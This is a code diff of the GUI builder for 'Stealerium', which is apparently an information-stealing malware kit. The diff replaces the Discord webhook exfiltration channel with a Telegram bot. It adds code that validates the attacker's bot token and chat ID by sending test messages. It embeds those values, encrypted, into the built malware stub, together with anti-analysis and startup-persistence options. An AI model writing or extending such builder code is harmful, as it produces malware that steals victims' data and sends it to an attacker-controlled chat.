@@ -1,4 +1,5 @@
 ﻿using System.IO;
+using System.Net.Http;
 using System.Windows;
 using System.Windows.Controls;
 using Microsoft.Win32;
@@ -9,7 +10,8 @@ namespace BuilderGUI
     {
         private string stubPath;
         private bool isStubDetected = false;
-        private bool isWebhookValid = false;
+        private bool isApiTokenValid = false;
+        private bool isChatIdValid = false;
 
         public MainWindow()
         {
@@ -46,38 +48,144 @@ namespace BuilderGUI
 
         private void UpdateBuildButtonState()
         {
-            BuildButton.IsEnabled = isStubDetected && isWebhookValid;
+            // Enable BuildButton only if both the stub is detected and both API token and chat ID are valid
+            BuildButton.IsEnabled = isStubDetected && isApiTokenValid && isChatIdValid;
         }
 
-        private async void TestWebhookButton_Click(object sender, RoutedEventArgs e)
+        private async void ApiTokenTextBox_TextChanged(object sender, TextChangedEventArgs e)
         {
-            var token = WebhookUrlTextBox.Text.Trim();
+            var token = ApiTokenTextBox.Text.Trim();
+
+            // Show the LoadingOverlay while validating
+            LoadingOverlay.Visibility = Visibility.Visible;
+
+            if (!string.IsNullOrEmpty(token))
+            {
+                isApiTokenValid = await Telegram.TokenIsValidAsync(token);  // Asynchronously validate the token
+                WebhookStatusLabel.Message = isApiTokenValid ? "Telegram API token is valid." : "Invalid Telegram API token!";
+                WebhookStatusLabel.Severity = isApiTokenValid ? Wpf.Ui.Controls.InfoBarSeverity.Success : Wpf.Ui.Controls.InfoBarSeverity.Error;
+            }
+            else
+            {
+                isApiTokenValid = false;
+                WebhookStatusLabel.Message = "Telegram API token cannot be empty.";
+                WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
+            }
+
+            // Hide the LoadingOverlay after validation
+            LoadingOverlay.Visibility = Visibility.Collapsed;
+
+            UpdateBuildButtonState();
+        }
+
+        private async void ChatIdTextBox_TextChanged(object sender, TextChangedEventArgs e)
+        {
+            var token = ApiTokenTextBox.Text.Trim();
+            var chatId = ChatIdTextBox.Text.Trim();
+
+            // Show the LoadingOverlay while validating
+            LoadingOverlay.Visibility = Visibility.Visible;
+
+            if (!string.IsNullOrEmpty(chatId) && !string.IsNullOrEmpty(token))
+            {
+                // Attempt to send a test message with the provided Chat ID to validate
+                isChatIdValid = await ValidateChatIdAsync(token, chatId);
+
+                if (isChatIdValid)
+                {
+                    WebhookStatusLabel.Message = "Telegram Chat ID is valid.";
+                    WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Success;
+                }
+                else
+                {
+                    WebhookStatusLabel.Message = "Invalid Telegram Chat ID.";
+                    WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
+                }
+            }
+            else
+            {
+                isChatIdValid = false;
+                WebhookStatusLabel.Message = "Telegram Chat ID cannot be empty.";
+                WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
+            }
+
+            // Hide the LoadingOverlay after validation
+            LoadingOverlay.Visibility = Visibility.Collapsed;
+
+            UpdateBuildButtonState();
+        }
+
+
+        // Helper method to validate Chat ID by sending a test message
+        private async Task<bool> ValidateChatIdAsync(string token, string chatId)
+        {
+            try
+            {
+                string testMessage = "Validating chat ID";
+                string telegramApiUrl = $"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatId}&text={Uri.EscapeDataString(testMessage)}";
+
+                using (HttpClient client = new HttpClient())
+                {
+                    HttpResponseMessage response = await client.GetAsync(telegramApiUrl);
+
+                    // If the response status code is 200, the Chat ID is valid
+                    return response.IsSuccessStatusCode;
+                }
+            }
+            catch (Exception ex)
+            {
+                // Log any exceptions, if needed
+                Console.WriteLine("Validation failed: " + ex.Message);
+                return false;
+            }
+        }
+
+        private async void TestTelegramButton_Click(object sender, RoutedEventArgs e)
+        {
+            var token = ApiTokenTextBox.Text.Trim();  // Get the Telegram bot token from the text box
+            var chatId = ChatIdTextBox.Text.Trim();   // Get the Telegram chat ID from the text box
+
             if (string.IsNullOrEmpty(token))
             {
                 var uiMessageBox = new Wpf.Ui.Controls.MessageBox
                 {
                     Title = "Error",
-                    Content =
-                       "Discord webhook URL cannot be empty.",
+                    Content = "Telegram bot API token cannot be empty.",
                 };
                 _ = await uiMessageBox.ShowDialogAsync();
                 return;
             }
 
-            TestWebhookButton.IsEnabled = false;
-            WebhookStatusLabel.Message = "Testing webhook...";
+            if (string.IsNullOrEmpty(chatId))
+            {
+                var uiMessageBox = new Wpf.Ui.Controls.MessageBox
+                {
+                    Title = "Error",
+                    Content = "Telegram chat ID cannot be empty.",
+                };
+                _ = await uiMessageBox.ShowDialogAsync();
+                return;
+            }
+
+            TestTelegramButton.IsEnabled = false;
+            WebhookStatusLabel.Message = "Testing Telegram connection...";
+            WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Informational;
             WebhookStatusLabel.IsOpen = true;
 
-            isWebhookValid = await Discord.WebhookIsValidAsync(token);
+            // Check if the Telegram API token is valid
+            bool isTokenValid = await Telegram.TokenIsValidAsync(token);
 
-            if (!isWebhookValid)
+            if (!isTokenValid)
             {
-                WebhookStatusLabel.Message = "Invalid webhook URL!";
+                WebhookStatusLabel.Message = "Invalid Telegram bot API token!";
                 WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
             }
             else
             {
-                bool messageSent = await Discord.SendMessageAsync("✅ *Stealerium* builder connected successfully!", token);
+                // Send a test message to the chat
+                int messageId = await Telegram.SendMessageAsync("✅ *Stealerium* builder connected successfully!", token, chatId);
+                bool messageSent = messageId > 0;
+
                 if (messageSent)
                 {
                     WebhookStatusLabel.Message = "Connected successfully!";
@@ -87,22 +195,12 @@ namespace BuilderGUI
                 {
                     WebhookStatusLabel.Message = "Failed to send test message.";
                     WebhookStatusLabel.Severity = Wpf.Ui.Controls.InfoBarSeverity.Error;
-                    isWebhookValid = false; // Consider webhook invalid if message fails
+                    isTokenValid = false; // Consider the token invalid if the message fails
                 }
             }
 
             UpdateBuildButtonState();
-
-            TestWebhookButton.IsEnabled = true;
-        }
-
-        private void WebhookUrlTextBox_TextChanged(object sender, TextChangedEventArgs e)
-        {
-            // Since the webhook URL has changed, we need to re-validate it.
-            isWebhookValid = false;
-            UpdateBuildButtonState();
-            WebhookStatusLabel.Message = "";
-            WebhookStatusLabel.IsOpen = false;
+            TestTelegramButton.IsEnabled = true;
         }
 
         private void StartupCheckBox_Checked(object sender, RoutedEventArgs e)
@@ -133,20 +231,34 @@ namespace BuilderGUI
         private void BuildStub()
         {
             // Collect and validate inputs
-            var token = WebhookUrlTextBox.Text.Trim();
+            var token = ApiTokenTextBox.Text.Trim();
+            var chatId = ChatIdTextBox.Text.Trim();
+
             if (string.IsNullOrEmpty(token))
             {
                 var uiMessageBox = new Wpf.Ui.Controls.MessageBox
                 {
                     Title = "Error",
-                    Content = "Discord webhook URL cannot be empty.",
+                    Content = "Telegram bot API token cannot be empty.",
                 };
                 _ = uiMessageBox.ShowDialogAsync();
                 return;
             }
 
-            // Set configuration values
-            Build.ConfigValues["Webhook"] = Crypt.EncryptConfig(token);
+            if (string.IsNullOrEmpty(chatId))
+            {
+                var uiMessageBox = new Wpf.Ui.Controls.MessageBox
+                {
+                    Title = "Error",
+                    Content = "Telegram chat ID cannot be empty.",
+                };
+                _ = uiMessageBox.ShowDialogAsync();
+                return;
+            }
+
+            // Set configuration values for build
+            Build.ConfigValues["TelegramAPI"] = Crypt.EncryptConfig(token);
+            Build.ConfigValues["TelegramID"] = Crypt.EncryptConfig(chatId);
             Build.ConfigValues["Debug"] = DebugCheckBox.IsChecked == true ? "1" : "0";
             Build.ConfigValues["AntiAnalysis"] = AntiAnalysisCheckBox.IsChecked == true ? "1" : "0";
             Build.ConfigValues["Startup"] = StartupCheckBox.IsChecked == true ? "1" : "0";
